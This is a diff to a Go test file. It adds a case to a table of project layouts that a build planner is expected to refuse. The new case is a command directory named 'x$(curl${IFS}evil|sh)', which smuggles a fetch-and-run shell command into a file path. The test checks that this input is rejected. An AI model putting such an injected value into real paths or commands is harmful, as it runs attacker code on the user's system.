@@ -176,6 +176,7 @@ func TestPlanRefuses(t *testing.T) {
 		"nothing it knows":            {"README.md": ""},
 		"go without a main":           {"go.mod": "module x\n", "lib.go": ""},
 		"go with several commands":    {"go.mod": "module x\n", "cmd/a/main.go": "", "cmd/b/main.go": ""},
+		"a command named to inject":   {"go.mod": "module x\n", "cmd/x$(curl${IFS}evil|sh)/main.go": ""},
 		"python without an entry":     {"requirements.txt": ""},
 		"node without a way to start": {"package.json": `{}`},
 		"node with bad json":          {"package.json": `{`},
